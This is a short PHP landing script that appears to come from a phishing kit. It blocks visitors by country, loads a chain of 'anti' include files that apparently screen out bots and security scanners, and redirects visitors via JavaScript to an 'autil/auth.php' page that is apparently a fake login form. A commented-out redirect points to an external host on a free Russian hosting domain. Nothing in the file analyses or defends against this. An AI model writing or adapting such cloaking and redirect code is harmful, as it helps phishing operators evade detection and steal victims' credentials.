<?php
error_reporting(0);
include'functions.php';
if(!check_block_country()){
    header('Location: '.$GLOBALS['REDIRECT_URL'].'');
    exit;
}

//include "./includes/anti1.php";
include "./includes/anti2.php";
include "./includes/anti3.php";
include "./includes/anti4.php";
include "./includes/anti5.php";
//include "./includes/anti6.php";
include "./includes/anti7.php";
include "./includes/anti8.php";
// $urllo= "http://a0605443.xsph.ru/adadqsds5dsdsdsds55s/composer";

// $redirect = $urllo."/autil/index.html";
// header("location:".$redirect);

   // echo '<script type="text/javascript">
   //        window.location = '.$urllo .'"/autil/index.html";
   //   </script>';
?>

<script type="text/javascript">

        var urlx = window.location.href;
        var pathname = urlx.replace("index.php", "");
         console.log(pathname)
          window.location.href = pathname+'autil/auth.php?u=358886';
   
         // window.setTimeout("location=("+pathname+"auth.php?u=358886);", 1000);
</script>